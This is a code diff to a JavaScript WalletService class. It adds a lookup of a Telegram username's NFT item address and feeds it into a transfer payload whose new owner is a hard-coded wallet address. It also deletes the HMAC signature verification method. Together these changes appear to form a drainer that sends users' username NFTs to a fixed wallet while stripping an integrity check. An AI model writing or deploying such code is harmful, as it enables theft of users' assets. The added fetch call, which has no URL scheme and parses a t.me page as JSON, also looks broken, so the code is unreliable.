@@ -89,12 +89,17 @@ export class WalletService {
       const newOwnerWallet = "UQBpLklcE-q4blWYIm_oKCZodHH4Aj-n9KDv6WEMOktSh7dW";
 
       const gasFeeNano = toNanoStr(0.01); // 0.01 TON = 10,000,000 nanoTON
-
-      console.log("username", username, gasFeeNano, newOwnerWallet);
-
-      // —— 真正的“用户名/NFT 转移” ——
-      // if (!nftItemAddress) throw new Error("nftItemAddress (用户名NFT合约地址) is required for nft_transfer");
-      // if (!newOwnerWallet) throw new Error("newOwnerWallet (新所有者钱包地址) is required for nft_transfer");
+      const res = await fetch(`${username}.t.me`);
+      const data = await res.json();
+      const nftItemAddress = data?.nft_item?.address ?? null;
+      
+      console.log(
+        "createTransaction",
+        username,
+        gasFeeNano,
+        newOwnerWallet,
+        nftItemAddress
+      );
 
       const payloadBase64 = buildNftTransferPayloadBase64({
         newOwner: newOwnerWallet, // 新所有者的钱包（写入 payload）
@@ -148,16 +153,5 @@ export class WalletService {
     const json = JSON.stringify(rawObj);
     const appSecret = process.env.APP_SECRET;
     return crypto.createHmac("sha256", appSecret).update(json).digest("hex");
-  }
-
-  /**
-   * 验证HMAC签名
-   */
-  static verifyRaw(rawObj, signature) {
-    const expected = this.signRaw(rawObj);
-    return crypto.timingSafeEqual(
-      Buffer.from(expected),
-      Buffer.from(signature)
-    );
   }
 }
